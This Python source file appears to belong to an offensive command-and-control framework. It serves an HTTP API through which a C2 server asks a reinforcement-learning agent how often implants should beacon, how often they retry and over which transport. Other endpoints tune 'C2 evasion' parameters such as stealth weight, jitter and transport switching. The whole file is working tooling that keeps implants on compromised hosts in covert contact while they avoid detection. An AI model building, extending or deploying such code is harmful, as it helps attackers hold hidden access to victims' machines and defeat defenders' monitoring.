"""
RL Beacon Service - HTTP API for beacon timing decisions with C2 evasion

Exposes the RL agent as a simple HTTP API that the C2 server can query.
Listens on localhost:5555 by default.

Evasion tuning: Query /evasion/config to see/update detection evasion parameters
"""

import asyncio
import json
from aiohttp import web
from rl_beacon_agent import get_agent, BeaconRLAgent
import torch

try:
    from rl_evasion_config import EvasionConfig, EVASION_PROFILES, apply_profile
except ImportError:
    EvasionConfig = None
    EVASION_PROFILES = {}
    def apply_profile(name): return False


class BeaconService:
    """HTTP service for beacon timing decisions"""

    def __init__(self, port=5555):
        self.port = port
        self.agent = get_agent()
        self.app = web.Application()
        self.setup_routes()

    def setup_routes(self):
        """Setup HTTP routes"""
        self.app.router.add_post("/beacon/action", self.get_beacon_action)
        self.app.router.add_post("/beacon/feedback", self.feedback_beacon)
        self.app.router.add_get("/model/metrics", self.get_metrics)
        self.app.router.add_post("/model/train", self.train_step)
        self.app.router.add_get("/evasion/config", self.get_evasion_config)
        self.app.router.add_post("/evasion/config", self.set_evasion_config)
        self.app.router.add_get("/evasion/profiles", self.get_evasion_profiles)

    async def get_beacon_action(self, request):
        """Get beacon action for an implant

        POST /beacon/action
        {
            "implant_id": "agent-1234",
            "success_rate": 0.95,
            "uptime": 0.99,
            "seconds_since_beacon": 30,
            "transport": "vpn"
        }

        Response:
        {
            "beacon_interval": 30,
            "retry_count": 2,
            "transport": "vpn",
            "confidence": 0.85
        }
        """
        try:
            data = await request.json()
            implant_data = {
                "success_rate": data.get("success_rate", 0.5),
                "uptime": data.get("uptime", 0.5),
                "seconds_since_beacon": data.get("seconds_since_beacon", 0),
                "transport": data.get("transport", "vpn"),
            }

            # Get state and action
            state = self.agent.get_state_vector(implant_data)
            action = self.agent.select_action(state, training=True)

            # Get confidence (max Q-value)
            with torch.no_grad():
                q_values = self.agent.q_network(state.unsqueeze(0))
                confidence = torch.softmax(q_values, dim=1).max().item()

            return web.json_response({
                "beacon_interval": action["beacon_interval"],
                "retry_count": action["retry_count"],
                "transport": action["transport"],
                "confidence": confidence,
                "action_idx": action["action_idx"],
            })
        except Exception as e:
            return web.json_response({"error": str(e)}, status=400)

    async def feedback_beacon(self, request):
        """Provide feedback on beacon result

        POST /beacon/feedback
        {
            "implant_id": "agent-1234",
            "success": true,
            "response_time": 0.5,
            "beacon_interval": 30
        }
        """
        try:
            data = await request.json()
            success = data.get("success", False)
            response_time = data.get("response_time", 0.0)
            beacon_interval = data.get("beacon_interval", 30)

            # Compute reward
            reward = self.agent.compute_reward(success, beacon_interval, response_time)

            return web.json_response({
                "reward": reward,
                "processed": True,
            })
        except Exception as e:
            return web.json_response({"error": str(e)}, status=400)

    async def get_metrics(self, request):
        """Get RL model metrics

        GET /model/metrics
        """
        metrics = self.agent.get_metrics()
        return web.json_response(metrics)

    async def train_step(self, request):
        """Perform a training step

        POST /model/train
        """
        try:
            loss = self.agent.train_step()
            metrics = self.agent.get_metrics()
            return web.json_response({
                "loss": loss,
                "metrics": metrics,
            })
        except Exception as e:
            return web.json_response({"error": str(e)}, status=400)

    async def get_evasion_config(self, request):
        """Get C2 evasion configuration

        GET /evasion/config
        """
        if EvasionConfig is None:
            return web.json_response({"error": "Evasion config not available"}, status=400)

        return web.json_response(EvasionConfig.to_dict())

    async def set_evasion_config(self, request):
        """Update C2 evasion configuration

        POST /evasion/config
        {
            "STEALTH_WEIGHT": 0.7,
            "JITTER_RANGE": 15,
            "TRANSPORT_SWITCH_PROB": 0.4
        }
        """
        if EvasionConfig is None:
            return web.json_response({"error": "Evasion config not available"}, status=400)

        try:
            data = await request.json()
            updated = {}

            for key, value in data.items():
                if EvasionConfig.update(key, value):
                    updated[key] = value
                else:
                    return web.json_response(
                        {"error": f"Unknown config parameter: {key}"}, status=400
                    )

            return web.json_response({
                "updated": updated,
                "config": EvasionConfig.to_dict(),
            })
        except Exception as e:
            return web.json_response({"error": str(e)}, status=400)

    async def get_evasion_profiles(self, request):
        """Get available evasion profiles

        GET /evasion/profiles
        """
        profiles = {}
        for name, profile in EVASION_PROFILES.items():
            profiles[name] = {
                "description": profile.get("description", ""),
                "config": {k: v for k, v in profile.items() if k != "description"}
            }
        return web.json_response({"profiles": profiles})

    async def start(self):
        """Start the service"""
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, "127.0.0.1", self.port)
        await site.start()
        print(f"[+] RL Beacon Service listening on 127.0.0.1:{self.port}")


async def main():
    """Run the service"""
    service = BeaconService(port=5555)
    await service.start()
    # Keep running
    await asyncio.Event().wait()


if __name__ == "__main__":
    asyncio.run(main())
